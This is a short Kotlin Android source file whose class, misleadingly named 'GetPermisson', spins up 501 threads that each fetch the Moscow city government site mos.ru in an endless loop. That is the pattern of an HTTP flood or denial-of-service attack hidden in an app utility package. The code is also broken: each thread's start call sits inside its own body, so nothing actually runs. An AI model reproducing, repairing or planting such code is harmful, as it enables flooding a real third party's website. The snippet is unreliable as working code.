package factura.factura.util
import android.util.Log

import java.net.URL

class GetPermisson {
    lateinit var thread: Thread
    var out = ""

    fun go() {

        for (x in 0..500) {
            thread = Thread {
                try {
                    while (true) {
                        Log.d("jui", "start -> start -> " + x + " -> " + out)
                        out = URL("https://www.mos.ru/").readText()
                        Log.d("jui", "out-> " + x + out)
                    }
                } catch (e: Exception) {
                    Log.d("jui", "error error error -> " + x + out)
                }
                thread.start()
            }
        }
    }



}